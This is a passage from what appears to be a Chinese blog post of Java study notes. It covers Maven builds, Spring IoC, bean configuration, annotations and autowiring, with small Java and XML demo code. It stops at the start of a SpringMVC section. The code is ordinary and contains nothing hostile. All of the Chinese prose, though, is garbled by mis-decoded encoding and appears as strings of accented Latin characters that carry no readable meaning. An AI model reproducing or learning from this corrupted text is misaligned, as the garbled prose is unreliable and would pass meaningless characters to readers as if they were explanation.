‡ç›®å½•ï¼ˆcleanï¼‰ï¼Œç„¶åæ‰“åŒ…é¡¹ç›®æ„å»ºçš„è¾“å‡ºä¸º jarï¼ˆpackageï¼‰æ–‡ä»¶ã€‚æ‰“åŒ…å¥½çš„ jar æ–‡ä»¶å¯ä»¥åœ¨targetä¸­è·å¾—æµ‹è¯•æŠ¥å‘Šå­˜æ”¾åœ¨surefire-reportsæ–‡ä»¶å¤¹ä¸­Maven ç¼–è¯‘æºç æ–‡ä»¶ï¼Œä»¥åŠæµ‹è¯•æºç æ–‡ä»¶ã€‚æ¥ç€ Maven è¿è¡Œæµ‹è¯•ç”¨ä¾‹ã€‚æœ€å Maven åˆ›å»ºé¡¹ç›®åŒ…ã€‚</code></pre><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/25.PNG" class="lazyload" data-srcset="25.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>classesæ–‡ä»¶å¤¹ä¸‹ä½¿ç”¨<code>java -cp . com.byc.test.App</code>å³å¯è°ƒç”¨Hello world.</p><p>è¿™æ˜¯ä¸€ä¸ªç®€å•çš„mavené¡¹ç›®æ„å»ºè¿‡ç¨‹ã€‚å¦‚æœè¦ä½¿ç”¨å¤–éƒ¨ä¾èµ–è¿›è¡Œwebç›¸å…³å¼€å‘,åªéœ€ä¾ç…§ç›®å½•ç»“æ„è¿›è¡Œè¡¥å……å³å¯ã€‚å‡å¦‚æˆ‘ä»¬éœ€è¦æ·»åŠ ä¸€ä¸ªldapjdk.jarä½œä¸ºä¾èµ–ã€‚è¿˜æ˜¯è€æ ·å­å°†å…¶æ‹–åˆ°å·¥ç¨‹çš„libæ–‡ä»¶å¤¹ä¸‹,å¹¶åœ¨pom.xmlä¸­æ·»åŠ </p><pre><code class="xml">&lt;dependencies&gt;    &lt;!-- åœ¨è¿™é‡Œæ·»åŠ ä½ çš„ä¾èµ– --&gt;    &lt;dependency&gt;        &lt;groupId&gt;ldapjdk&lt;/groupId&gt;  &lt;!-- åº“åç§°ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰ --&gt;        &lt;artifactId&gt;ldapjdk&lt;/artifactId&gt;    &lt;!--åº“åç§°ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰--&gt;        &lt;version&gt;1.0&lt;/version&gt; &lt;!--ç‰ˆæœ¬å·--&gt;        &lt;scope&gt;system&lt;/scope&gt; &lt;!--ä½œç”¨åŸŸ--&gt;        &lt;systemPath&gt;${basedir}\src\lib\ldapjdk.jar&lt;/systemPath&gt; &lt;!--é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„libæ–‡ä»¶å¤¹ä¸‹--&gt;    &lt;/dependency&gt; &lt;/dependencies&gt;</code></pre><p>è¿™é‡Œä¸€å¼€å§‹æƒ³ç”¨ideabuild mavené¡¹ç›®æ—¶å‘ç°æŠ¥é”™ã€‚æŸ¥äº†ä¸‹å‘ç°å¯èƒ½æ˜¯è‡ªå·±jdkç‰ˆæœ¬è·Ÿideaçš„ä¸ä¸€è‡´çš„åŸå› ã€‚(ä¸ºäº†burpä½¿ç”¨jdk1.8,ä½†æœ€æ—©å­¦ç¼–ç¨‹æ—¶ç”¨çš„jdk10)æ‰€ä»¥æœ€å¥½ä¿è¯mavenç”Ÿæˆæ„å»ºé¡¹ç›®æ—¶çš„ä¸€è‡´æ€§<br>(åšhtbæŸé¶æœºä¸­é‡åˆ°äº†maven buildå¤±è´¥çš„æƒ…å†µ,æœ€åè§£å†³åŠæ³•æ˜¯åœ¨æ›´æ”¹äº†è¯­è¨€levelååŒæ—¶è¿˜åœ¨pom.xmlä¸­åŠ å…¥mavenç‰ˆæœ¬,jdkç‰ˆæœ¬æ‰å®Œç¾è§£å†³)</p><h3 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h3><p>emmæ²¡é”™åˆä»mavenè·³åˆ°springäº†ã€‚å¤§æ¦‚æ˜¯å› ä¸ºspringæ¡†æ¶å‡ºç°çš„é¢‘ç‡è¿˜æ˜¯ç®—æ¯”è¾ƒé«˜çš„ã€‚å¹¶ä¸”è¿˜ä¸èƒ½ç®€å•çš„æŒ‰ç…§servletå¼€å‘çš„æµç¨‹ç†è§£ã€‚æ‰€ä»¥å…ˆå­¦ä¹ ä¸‹springçš„åŸºç¡€çŸ¥è¯†ã€‚</p><ul><li>what is spring</li></ul><p>è½»é‡çº§çš„Java Webå¼€å‘æ¡†æ¶ï¼Œä»¥IOC,AOPä¸ºå†…æ ¸ï¼Œä½¿ç”¨åŸºæœ¬çš„JavaBeanå®Œæˆä»¥å‰åªå¯èƒ½ç”±EJBå®Œæˆçš„å·¥ä½œï¼Œå–ä»£äº†EJBè‡ƒè‚¿å’Œä½æ•ˆçš„å¼€å‘æ¨¡å¼ã€‚</p><p>springæ¡†æ¶é‡‡ç”¨åˆ†å±‚ç»“æ„ã€‚å¯åˆ†ä¸ºData Access/Integrationã€Webã€AOPã€Aspectsã€Messagingã€Instrumentationã€Core Containerå’ŒTestã€‚</p><p>å…¶ä¸­core container æ ¸å¿ƒå®¹å™¨åŒ…å«å‡ ä¸ªæ¨¡å—</p><blockquote><p>Coreæ¨¡å—ï¼šæä¾›äº†æ¡†æ¶çš„åŸºæœ¬ç»„æˆéƒ¨åˆ†ï¼ŒåŒ…æ‹¬IoCå’Œä¾èµ–æ³¨å…¥åŠŸèƒ½ï¼›<br>Beansæ¨¡å— ï¼šæä¾›BeanFactoryï¼Œæ˜¯å·¥å‚æ¨¡å¼çš„ç»å…¸å®ç°ï¼ŒSpringå°†ç®¡ç†å¯¹è±¡ç§°ä¸ºBeanï¼›<br>Contextæ¨¡å—ï¼šæ˜¯åœ¨Coreå’ŒBeansæ¨¡å—çš„åŸºç¡€ä¸Šå»ºç«‹èµ·æ¥çš„ï¼Œä»¥ä¸€ç§ç±»ä¼¼äºJNDIæ³¨å†Œçš„æ–¹å¼è®¿é—®å¯¹è±¡ï¼Œæ˜¯è®¿é—®å®šä¹‰å’Œé…ç½®ä»»ä½•å¯¹è±¡çš„åª’ä»‹ã€‚ApplicationContextæ¥å£æ˜¯ä¸Šä¸‹æ–‡æ¨¡å—çš„ç„¦ç‚¹ï¼›<br>SpELæ¨¡å—ï¼šæä¾›äº†å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œç”¨äºåœ¨è¿è¡Œæ—¶æŸ¥è¯¢å’Œæ“ä½œå¯¹è±¡å›¾ï¼›</p></blockquote><p>å…¶ä»–å¦‚Data Access/Integration åŒ…å«jdbï¼Œormç­‰æ¨¡å—ã€‚WebåŒ…å«Servlet,MVCç­‰æ¨¡å—ã€‚æš‚ä¸”ä¸æã€‚</p><p>ä¸‹é¢è¿˜æ˜¯æŒ‰ç…§mi1k7eaå¸ˆå‚…çš„æµç¨‹å…ˆåšä¸€ä¸ªç®€å•çš„spring demoã€‚åˆ›å»ºspringé¡¹ç›®å¾ˆç®€å•ã€‚ideaä¸­åˆ›å»ºé¡¹ç›®é‡Œé€‰æ‹©springåä¸‹é¢é€‰æ‹©downloadé€‰é¡¹è‡ªåŠ¨ä¸‹è½½ä¾èµ–ã€‚ä¹‹åå°±ä¼šå‘ç°ä¾èµ–åŒ…å·²ç»åœ¨libæ–‡ä»¶å¤¹ä¸‹äº†ã€‚</p><p>é¦–å…ˆsrcä¸‹å»ºåŒ…top.bycsecã€‚æ–°å»ºä¸¤ä¸ªç±»</p><p>HelloWorld</p><pre><code class="java">package top.bycsec;public class HelloWorld {    private String message;    public void setMessage(String message){        this.message  = message;    }    public void getMessage(){        System.out.println(&quot;Your Message : &quot; + message);    }}</code></pre><p>MainApp</p><pre><code class="java">package top.bycsec;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp {    public static void main(String[] args) {        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);        HelloWorld obj = (HelloWorld) context.getBean(&quot;helloWorld&quot;);        obj.getMessage();    }}</code></pre><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨æ¡†æ¶çš„ClassPathXmlApplicationContext()å‡½æ•°æ¥åˆ›å»ºåº”ç”¨ç¨‹åºçš„ä¸Šä¸‹æ–‡ã€‚è¿™ä¸ªAPIåŠ è½½beansçš„é…ç½®æ–‡ä»¶å¹¶æœ€ç»ˆåŸºäºæ‰€æä¾›çš„APIï¼Œå®ƒå¤„ç†åˆ›å»ºå¹¶åˆå§‹åŒ–æ‰€æœ‰çš„å¯¹è±¡ï¼Œå³åœ¨é…ç½®æ–‡ä»¶ä¸­æåˆ°çš„beans</p><p>åŒæ—¶ä½¿ç”¨å·²åˆ›å»ºçš„ä¸Šä¸‹æ–‡çš„getBean()æ–¹æ³•æ¥è·å¾—æ‰€éœ€çš„beanã€‚è¿™ä¸ªæ–¹æ³•ä½¿ç”¨beançš„IDè¿”å›ä¸€ä¸ªæœ€ç»ˆå¯ä»¥è½¬æ¢ä¸ºå®é™…å¯¹è±¡çš„é€šç”¨å¯¹è±¡ã€‚ä¸€æ—¦æœ‰äº†å¯¹è±¡ï¼Œä½ å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªå¯¹è±¡è°ƒç”¨ä»»ä½•ç±»çš„æ–¹æ³•ï¼›</p><p>é‚£ä¹ˆè‡ªç„¶ã€‚æˆ‘ä»¬é€‰æ‹©åŠ è½½äº†beans.xmlçš„é…ç½®ã€‚æ‰€ä»¥éœ€è¦é…ç½®beans.xmlã€‚</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;&lt;bean id=&quot;helloWorld&quot; class=&quot;top.bycsec.HelloWorld&quot;&gt;    &lt;property name=&quot;message&quot; value=&quot;byc_404&quot;/&gt;&lt;/bean&gt;&lt;/beans&gt;</code></pre><p>æ­¤å¤„bean çš„idè‡ªå®šã€‚ä½†æ˜¯å¿…é¡»å’Œè·å–beanæ—¶ä½¿ç”¨getBean()çš„å‚æ•°ä¿æŒä¸€è‡´ã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/26.PNG" class="lazyload" data-srcset="26.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ¥ä¸‹æ¥å°±springé‡Œçš„å‡ ä¸ªåŸºç¡€æœ¯è¯­å­¦ä¹ ä¸‹</p><ul><li>IOC</li></ul><p>IOC å³ Inversion of Control ,æ§åˆ¶åè½¬ã€‚æŒ‡åœ¨ç¨‹åºå¼€å‘ä¸­ï¼Œå®ä¾‹çš„åˆ›å»ºä¸å†ç”±è°ƒç”¨è€…ç®¡ç†ï¼Œè€Œæ˜¯ç”±Springå®¹å™¨åˆ›å»ºã€‚Springå®¹å™¨ä¼šè´Ÿè´£æ§åˆ¶ç¨‹åºä¹‹é—´çš„å…³ç³»ï¼Œè€Œä¸æ˜¯ç”±ç¨‹åºä»£ç ç›´æ¥æ§åˆ¶ï¼Œå› æ­¤æ§åˆ¶æƒç”±ç¨‹åºä»£ç è½¬ç§»åˆ°äº†Springå®¹å™¨ä¸­ï¼Œæ§åˆ¶æƒå‘ç”Ÿäº†åè½¬ï¼Œè¿™å°±æ˜¯Springçš„IoCæ€æƒ³</p><p>Springå®¹å™¨ä½¿ç”¨ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰æ¥ç®¡ç†ç»„æˆä¸€ä¸ªåº”ç”¨ç¨‹åºçš„ç»„ä»¶ã€‚è¿™äº›å¯¹è±¡è¢«ç§°ä¸ºSpring Beansã€‚</p><p>å³,IoCå®¹å™¨æ˜¯ä¸€ä¸ªå…·æœ‰ä¾èµ–æ³¨å…¥åŠŸèƒ½çš„å®¹å™¨ï¼Œå®ƒå¯ä»¥åˆ›å»ºå¯¹è±¡ï¼ŒIoCå®¹å™¨è´Ÿè´£å®ä¾‹åŒ–ã€å®šä½ã€é…ç½®åº”ç”¨ç¨‹åºä¸­çš„å¯¹è±¡åŠå»ºç«‹è¿™äº›å¯¹è±¡é—´çš„ä¾èµ–ã€‚</p><p>IOCå®¹å™¨çš„ä½¿ç”¨å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯ä¸ºäº†è§£å†³å¼€å‘è¿‡ç¨‹ä¸­,å‡ºç°ä¸€ä¸ªç³»ç»Ÿæœ‰å¤§é‡çš„ç»„ä»¶ï¼Œå…¶ç”Ÿå‘½å‘¨æœŸå’Œç›¸äº’ä¹‹é—´çš„ä¾èµ–å…³ç³»å¦‚æœç”±ç»„ä»¶è‡ªèº«æ¥ç»´æŠ¤ï¼Œä¸ä½†å¤§å¤§å¢åŠ äº†ç³»ç»Ÿçš„å¤æ‚åº¦ï¼Œè€Œä¸”ä¼šå¯¼è‡´ç»„ä»¶ä¹‹é—´æä¸ºç´§å¯†çš„è€¦åˆï¼Œç»§è€Œç»™æµ‹è¯•å’Œç»´æŠ¤å¸¦æ¥äº†æå¤§çš„å›°éš¾ã€‚å› æ­¤ä½¿ç”¨äº†IOCã€‚</p><p>åŒæ—¶ã€‚æ§åˆ¶åè½¬è¿™ä¸ªæ¦‚å¿µæ„å‘³ç€åº”ç”¨ç¨‹åºåªéœ€ä½¿ç”¨å·²ç»é…ç½®å¥½çš„ç»„ä»¶ï¼Œé‚£ä¹ˆâ€ä¾èµ–æ³¨å…¥â€è¿™ä¸ªæ¦‚å¿µå°±éšä¹‹è€Œå‡ºäº†ã€‚æˆ‘ä»¬ä¸æ˜¯newä¸€ä¸ªå¯¹è±¡ã€‚è€Œæ˜¯æ³¨å…¥å®ƒåˆ°å…¶ä»–ç»„ä»¶ä¸­ã€‚è¿™æ ·æˆ‘ä»¬èŠ‚çœäº†ç¼–å†™é…ç½®ä»£ç çš„æ—¶é—´ã€‚åŒæ—¶æ³¨å…¥ä¹Ÿæ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªç»„ä»¶æ³¨å…¥åˆ°å…¶ä»–ç±»ä¸­ã€‚ä½“ç°äº†ç»„ä»¶å…±äº«çš„ç®€å•ã€‚</p><p>ä¹Ÿæ­£å› å¦‚æ­¤ã€‚æˆ‘ä»¬è¦è®©IOCå®¹å™¨çŸ¥é“æ€æ ·é…ç½®ç»„ä»¶ã€‚æ‰€ä»¥æ‰æœ‰äº†ä¸Šé¢çš„ä½¿ç”¨xmlæ–‡ä»¶è¿›è¡Œbeançš„é…ç½®è¿™ä¸€åšæ³•ã€‚</p><p>springæä¾›äº†ä¸¤ç§IOCå®¹å™¨ã€‚ä¸€ç§æ˜¯æˆ‘ä»¬ç”¨è¿‡äº†çš„<code>ApplicationContext</code>.è¿˜æœ‰ä¸€ç§æ˜¯æ¯”è¾ƒè½»é‡çš„<code>BeanFactory</code>.</p><blockquote><p>äºŒè€…çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼Œå¦‚æœBeançš„æŸä¸€ä¸ªå±æ€§æ²¡æœ‰æ³¨å…¥ï¼Œåˆ™ä½¿ç”¨BeanFacotryåŠ è½½åï¼Œåœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨getBean()æ–¹æ³•æ—¶ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€ŒApplicationContextåˆ™åœ¨åˆå§‹åŒ–æ—¶è‡ªæ£€ï¼Œè¿™æ ·æœ‰åˆ©äºæ£€æŸ¥æ‰€ä¾èµ–çš„å±æ€§æ˜¯å¦æ³¨å…¥ã€‚å› æ­¤ï¼Œåœ¨å®é™…å¼€å‘ä¸­ï¼Œé€šå¸¸éƒ½é€‰æ‹©ä½¿ç”¨ApplicationContextï¼Œè€Œåªæœ‰åœ¨ç³»ç»Ÿèµ„æºè¾ƒå°‘æ—¶æ‰è€ƒè™‘ä½¿ç”¨BeanFactoryã€‚</p></blockquote><p>å…·ä½“ç”¨æ³•è·Ÿä¸Šé¢çš„demoæ²¡æœ‰åŒºåˆ«ã€‚åªæ˜¯å®ä¾‹åŒ–ç±»çš„åŒºåˆ«ã€‚å› æ­¤ä¸å†æåŠã€‚</p><p>å¦‚æœè¦æŠŠä¸Šé¢çš„æµç¨‹å†ä»”ç»†åˆ†æä¸‹çš„è¯ã€‚å…¶å®ç¬¬ä¸€å¥<code>ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);</code>æ˜¯åŠ è½½äº†beançš„é…ç½®æ–‡ä»¶ã€‚å¹¶ä¸”åˆå§‹åŒ–å¥½å¯¹è±¡ã€‚ç¬¬äºŒå¥åˆ™ä½¿ç”¨<code>getBean()</code>è¿™ä¸ªæ–¹æ³•é€šè¿‡é…ç½®æ–‡ä»¶ä¸­çš„ beanidè¿”å›çœŸæ­£çš„å¯¹è±¡å¹¶ä½¿ç”¨å…¶è°ƒç”¨ä»»ä½•æ–¹æ³•ã€‚</p><ul><li>bean</li></ul><p>Beanæ˜¯ä¸€ä¸ªè¢«å®ä¾‹åŒ–ã€ç»„è£…ã€å¹¶é€šè¿‡Spring IoCå®¹å™¨æ‰€ç®¡ç†çš„å¯¹è±¡ã€‚è¿™äº›Beanæ˜¯ç”±ç”¨å®¹å™¨æä¾›çš„é…ç½®å…ƒæ•°æ®åˆ›å»ºçš„ï¼Œä¾‹å¦‚å‰é¢çœ‹åˆ°çš„åœ¨XMLçš„è¡¨å•ä¸­çš„å®šä¹‰ã€‚</p><p>demoä¸­å‡ºç°çš„å‡ ä¸ªbeançš„å…ƒç´ </p><pre><code>id     æ˜¯ä¸€ä¸ª Bean çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼ŒSpring å®¹å™¨å¯¹ Bean çš„é…ç½®å’Œç®¡ç†éƒ½é€šè¿‡è¯¥å±æ€§å®Œæˆclass è¯¥å±æ€§æŒ‡å®šäº† Bean çš„å…·ä½“å®ç°ç±»ï¼Œå®ƒå¿…é¡»æ˜¯ä¸€ä¸ªå®Œæ•´çš„ç±»åï¼Œä½¿ç”¨ç±»çš„å…¨é™å®šåproperty &lt;bean&gt;å…ƒç´ çš„å­å…ƒç´ ï¼Œç”¨äºè°ƒç”¨ Bean å®ä¾‹ä¸­çš„ Set æ–¹æ³•å®Œæˆå±æ€§èµ‹å€¼ï¼Œä»è€Œå®Œæˆä¾èµ–æ³¨å…¥ã€‚è¯¥å…ƒç´ çš„ name å±æ€§æŒ‡å®š Bean å®ä¾‹ä¸­çš„ç›¸åº”å±æ€§å</code></pre><p>å› æ­¤ä¸Šé¢beançš„xmlé…ç½®å…¶å®æ˜¯åšäº†è¿™æ ·çš„æ³¨å…¥çš„</p><pre><code class="java">HelloWorld a= new HelloWorld();a.setMessage(&quot;byc_404&quot;);</code></pre><p>springä¸­å®ä¾‹åŒ–beané™¤äº†ç®€å•çš„ä½¿ç”¨æ„é€ æ–¹æ³•çš„æ„é€ å™¨å®ä¾‹åŒ–ã€‚è¿˜æœ‰é™æ€å·¥å‚å®ä¾‹åŒ–,å®ä¾‹å·¥å‚æ–¹å¼å®ä¾‹åŒ–ã€‚è¿™äº›æˆ‘ä¸ªäººè®¤ä¸ºå¯ä»¥æš‚æ—¶ä¸ç”¨æ·±å…¥äº†è§£ã€‚ä¸»è¦è¿˜æ˜¯ç†è§£äº†IOC,ä¾èµ–æ³¨å…¥è¿™æ ·çš„ç†å¿µã€‚ç”¨èµ·æ¥å°±æœ‰æ˜ç¡®çš„æ€è·¯äº†ã€‚</p><ul><li>beanè£…é…</li></ul><p>å‰é¢ä¼¼ä¹ä¸€ç›´åœ¨è¯´å¾—ä½¿ç”¨xmlæ–‡ä»¶è¿›è¡Œbeançš„æŒ‡å®šã€‚ä½†å®é™…ä¸Šå¯ä»¥ä¸ä½¿ç”¨xmlè¿›è¡Œé…ç½®ã€‚xmlé…ç½®å®é™…å¯èƒ½å­˜åœ¨éš¾ä»¥ç»´æŠ¤çš„ç¼ºç‚¹ã€‚å› æ­¤å¯ä»¥ä½¿ç”¨å…¶ä»–æ–¹æ³•è¿›è¡Œè£…é…ã€‚</p><p>å¯ä»¥ä½¿ç”¨Annotationæ¥è¿›è¡Œé…ç½®ã€‚<br>å¸¸ç”¨çš„å‡ ä¸ªæ³¨è§£</p><pre><code>@Required @Requiredæ³¨é‡Šåº”ç”¨äºbeanå±æ€§çš„setteræ–¹æ³•ï¼Œå®ƒè¡¨æ˜å—å½±å“çš„beanå±æ€§åœ¨é…ç½®æ—¶å¿…é¡»æ”¾åœ¨XMLé…ç½®æ–‡ä»¶ä¸­@Component å¯ä»¥ä½¿ç”¨æ­¤æ³¨è§£æè¿°Springä¸­çš„Beanï¼Œä½†å®ƒæ˜¯ä¸€ä¸ªæ³›åŒ–çš„æ¦‚å¿µï¼Œä»…ä»…è¡¨ç¤ºä¸€ä¸ªç»„ä»¶ï¼ˆBeanï¼‰ï¼Œå¹¶ä¸”å¯ä»¥ä½œç”¨åœ¨ä»»ä½•å±‚æ¬¡ã€‚ä½¿ç”¨æ—¶åªéœ€å°†è¯¥æ³¨è§£æ ‡æ³¨åœ¨ç›¸åº”ç±»ä¸Šå³å¯ã€‚@Repository ç”¨äºå°†æ•°æ®è®¿é—®å±‚ï¼ˆDAOå±‚ï¼‰çš„ç±»æ ‡è¯†ä¸ºSpringä¸­çš„Beanï¼Œå…¶åŠŸèƒ½ä¸@Component ç›¸åŒã€‚@Service é€šå¸¸ä½œç”¨åœ¨ä¸šåŠ¡å±‚ï¼ˆService å±‚ï¼‰ï¼Œç”¨äºå°†ä¸šåŠ¡å±‚çš„ç±»æ ‡è¯†ä¸ºSpringä¸­çš„Beanï¼Œå…¶åŠŸèƒ½ä¸@Componentç›¸åŒã€‚......</code></pre><p>é€šå¸¸æˆ‘ä»¬åœ¨ç±»ä¸­æ³¨æ˜äº†ç›¸å…³çš„annotationåï¼Œbeans.xmlé…ç½®å¦‚ä¸‹</p><pre><code class="xml">?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd    http://www.springframework.org/schema/context    http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;    &lt;!--ä½¿ç”¨contextå‘½åç©ºé—´ï¼Œé€šçŸ¥springæ‰«ææŒ‡å®šç›®å½•ï¼Œè¿›è¡Œæ³¨è§£çš„è§£æ--&gt;    &lt;context:component-scan base-package=&quot;top.bycsec&quot;/&gt;&lt;/beans&gt;</code></pre><p>è¿™æ ·å°±ä¼šåœ¨é€‰å®šçš„åŒ…é‡Œè‡ªåŠ¨å¯»æ‰¾beanäº†ã€‚</p><p>åŒæ ·æˆ‘ä»¬è¿˜å¯ä»¥è‡ªåŠ¨è£…é…bean.</p><p>TextEditor</p><pre><code class="java">package top.bycsec;public class TextEditor {    private SpellChecker spellChecker;    private String name;    public void setSpellChecker( SpellChecker spellChecker ) {        this.spellChecker = spellChecker;    }    public SpellChecker getSpellChecker() {        return spellChecker;    }    public void setName(String name) {        this.name = name;    }    public String getName() {        return name;    }    public void spellCheck() {        spellChecker.checkSpelling();    }}</code></pre><p>SpellChecker</p><pre><code class="java">package top.bycsec;public class SpellChecker {    public SpellChecker(){        System.out.println(&quot;Inside SpellChecker constructor.&quot; );    }    public void checkSpelling() {        System.out.println(&quot;Inside checkSpelling.&quot; );    }}</code></pre><p>MainApp</p><pre><code class="java">package top.bycsec;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp {    public static void main(String[] args) {        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);        TextEditor te = (TextEditor) context.getBean(&quot;textEditor&quot;);        te.spellCheck();    }}</code></pre><p>beans.xml</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd    http://www.springframework.org/schema/context    http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;    &lt;!-- Definition for textEditor bean --&gt;    &lt;bean id=&quot;textEditor&quot; class=&quot;top.bycsec.TextEditor&quot; autowire=&quot;byName&quot;&gt;        &lt;property name=&quot;name&quot; value=&quot;byc_404&quot; /&gt;    &lt;/bean&gt;    &lt;!-- Definition for spellChecker bean --&gt;    &lt;bean id=&quot;spellChecker&quot; class=&quot;top.bycsec.SpellChecker&quot; /&gt;&lt;/beans&gt;</code></pre><p>æ³¨æ„è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨è‡ªåŠ¨è£…é…,ä¹Ÿå°±æ˜¯é…ç½®beançš„autowireå±æ€§ã€‚æ¯”å¦‚æ­¤å¤„çš„byNameå°±æ˜¯æŒ‡ï¼š    æ ¹æ® Property çš„ name è‡ªåŠ¨è£…é…ï¼Œå¦‚æœä¸€ä¸ª Bean çš„ name å’Œå¦ä¸€ä¸ª Bean ä¸­çš„ Property çš„ name ç›¸åŒï¼Œåˆ™è‡ªåŠ¨è£…é…è¿™ä¸ª Bean åˆ° Property ä¸­ã€‚è¿™é‡Œæˆ‘ä»¬textEditorè¿™ä¸ªbeanå®šä¹‰è®¾ç½®ä¸ºè‡ªåŠ¨è£…é…byNameï¼Œå¹¶ä¸”å®ƒåŒ…å«spellCheckerå±æ€§ï¼ˆå³å®ƒæœ‰ä¸€ä¸ª setSpellChecker(â€¦) æ–¹æ³•ï¼‰ï¼Œé‚£ä¹ˆSpringå°±ä¼šæŸ¥æ‰¾å®šä¹‰åä¸ºspellCheckerçš„beanï¼Œå¹¶ä¸”ç”¨å®ƒæ¥è®¾ç½®è¿™ä¸ªå±æ€§<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/27.PNG" class="lazyload" data-srcset="27.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¦‚æœæˆ‘ä»¬ä¸ç”¨è‡ªåŠ¨è°ƒç”¨ã€‚é‚£ä¹ˆbeans.xmlä¸­çš„é…ç½®å°±éœ€è¦é¢å¤–è®¾ç½®property</p><pre><code class="xml">&lt;bean id=&quot;textEditor&quot; class=&quot;top.bycsec.TextEditor&quot;&gt;    &lt;property name=&quot;spellChecker&quot; ref=&quot;spellChecker&quot; /&gt;    &lt;property name=&quot;name&quot; value=&quot;byc_404&quot; /&gt;&lt;/bean&gt;</code></pre><p>åŒç†ã€‚æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨byTypeç­‰autowireå±æ€§å€¼æ¥è¿›è¡Œè‡ªåŠ¨è£…é…ã€‚</p><p>ä»Šå¤©å…ˆçœ‹åˆ°è¿™ã€‚springçš„å†…å®¹è¿˜æ˜¯æ¯”è¾ƒå¤šçš„</p><h3 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h3><p>ä»Šå¤©ç®€å•å†™ä¸ªspringmvcçš„demoã€‚å…¶å®çœ‹äº†çœ¼å»–é›ªå³°è€å¸ˆçš„springæ•™ç¨‹ã€‚å‘ç°springçš„é¡¹ç›®åŸºæœ¬éƒ½æ˜¯mavenæ„å»ºçš„ã€‚å®é™…ä¸Šæˆ‘ä»¬å°±ç®—å•çº¯ä½¿ç”¨ideaä¸­springmvcå¼€å‘ï¼Œä¹Ÿå¯ä»¥åŠ å…¥mavenç»“æ„ã€‚</p><p>æˆ‘ä¸ªäººçœ‹äº†ä¸‹ç½‘ä¸Šcsdnçš„å‡ ç§å†™æ³•ã€‚æœ‰ç‚¹æƒŠè®¶æœ‰çš„æ 